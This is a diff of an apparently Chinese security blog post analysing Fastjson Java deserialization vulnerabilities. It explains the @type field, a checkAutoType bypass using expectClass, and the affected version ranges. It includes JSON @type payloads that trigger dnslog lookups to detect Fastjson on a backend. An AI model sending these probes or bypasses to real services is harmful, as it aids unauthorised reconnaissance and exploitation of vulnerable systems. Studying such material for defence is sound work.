+<p>使用fastjson进行序列化的时候，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。所以引入了@type字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型。</p>
 <p>2.checkAutotype安全机制</p>
 <pre><code>public class demo &#123;
     public static void main(String[] args) &#123;
@@ -1237,23 +1230,32 @@ public class poc &#123;
     &#125;
 &#125;
 </code></pre>
-<p>第一个@type 会检测checkautotype,如果直接使用<code>org.openqa.selenium.WebDriverException</code>会触发cheOutType 退出,那就需要绕过checkautoType，作者绕过就是使用了expectClass,设定第一个@type 为<code>java.lang.Exception</code></p>
+<p>第一个@type 会检测checkautotype,如果直接使用org.openqa.selenium.WebDriverException会触发cheOutType 退出,那就需要绕过checkautoType，作者绕过就是使用了expectClass,设定第一个@type 为java.lang.Exception</p>
 <pre><code>1.白名单里的类
 2.开启了 autotype
 3.使用了 JSONType 注解
 4.指定了期望类（expectClass）
 5.缓存 mapping 中的类
 </code></pre>
-<h2 id="0x11-dnslog判断后端是否使用fastjson"><a href="#0x11-dnslog判断后端是否使用fastjson" class="headerlink" title="0x11 dnslog判断后端是否使用fastjson"></a>0x11 dnslog判断后端是否使用fastjson</h2><p>最新版本1.2.67</p>
+<h2 id="0x11-dnslog判断后端是否使用fastjson"><a href="#0x11-dnslog判断后端是否使用fastjson" class="headerlink" title="0x11 dnslog判断后端是否使用fastjson"></a>0x11 dnslog判断后端是否使用fastjson</h2><p>1.2.48之前版本</p>
+<pre><code>&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
+</code></pre>
+<p>最新版本1.2.67</p>
 <pre><code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
 &#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;
 </code></pre>
 <p>畸形的</p>
 <pre><code>&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;
 </code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>1.JdbcRowSetImpl 链</p>
-<p>优点：利用范围更广，即触更为容易</p>
-<p>缺点：当fastjson 不出网的话这个方法基本上都是gg（在实际过程中遇到了很多不出网的情况）同时高版本jdk中codebase默认为true，这样意味着，我们只能加载受信任的地址 。</p>
+<h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><ol>
+<li>fastjson漏洞版本很多，首先是从最开始的1.2.22-1.2.24因@type引发的反序列化漏洞。</li>
+<li>到 了1.2.25版本意识到危害后把@type改为默认关闭，还添加了黑白名单进行校验开启autotype传入的@type。</li>
+<li>在1.2.48版本之前中途出的发布的各种版本都是由于之前的漏洞修复很草率而出的，期间还有了1.2.25-1.2.47通杀payload。<ol>
+<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li>
+<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用直到1.2.48后才完全修复之前的过问题。</li>
+</ol>
+</li>
+</ol>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/#fastjson-lt-1-2-66">https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/#fastjson-lt-1-2-66</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/942/#classreference-factory">https://paper.seebug.org/942/#classreference-factory</a></p>
@@ -1273,12 +1275,12 @@ public class poc &#123;
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">Title:</span></p>
-    <p><span class="copy-title">Count:</span><span class="post-count">5.2k</span></p>
+    <p><span class="copy-title">Title:</span>Java反序列化-Fastjson漏洞全分析</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">5.3k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
-    <p><span class="copy-title">Created At:</span>2021-12-13, 14:17:03</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-23, 17:27:02</p>
-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/" title="">http://example.com/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%88%86%E6%9E%90/</a>
+    <p><span class="copy-title">Created At:</span>2021-12-18, 18:00:12</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-24, 11:23:54</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/" title="Java反序列化-Fastjson漏洞全分析">http://example.com/2021/12/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections1%E5%88%86%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
